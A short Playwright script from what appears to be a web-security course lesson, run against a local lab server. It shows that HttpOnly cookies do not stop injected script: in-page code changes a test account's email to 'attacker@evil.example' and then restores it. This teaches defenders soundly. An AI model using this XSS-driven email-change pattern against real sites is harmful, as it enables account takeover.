// demo3/httponly-xss.mjs — lesson 3.2: HttpOnly stops a script from READING the session cookie, not from USING it.
// "Injected script" = code run inside a LabFlow ID page (an XSS). Server: LabFlow ID v0.3 on :4800.
import { chromium } from 'playwright';
const browser = await chromium.launch();
const page = await browser.newPage();
await page.goto('http://localhost:4800/me');
await page.evaluate(() => fetch('/sign-in', { method: 'POST', headers: { 'content-type': 'application/json' },
  body: JSON.stringify({ email: 'an@student.labflow.example', password: 'an-lab-2026' }) }));
const out = await page.evaluate(async () => {
  const post = (email) => fetch('/me/email', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ email }) });
  const r = await post('attacker@evil.example');
  const after = await (await fetch('/me')).json();
  await post('an@student.labflow.example');                        // put An's email back for the next demos
  return { cookieSeenByScript: document.cookie, emailChange: `${r.status} ${await r.text()}`, meAfter: after.email };
});
console.log(JSON.stringify(out, null, 1));
await browser.close();
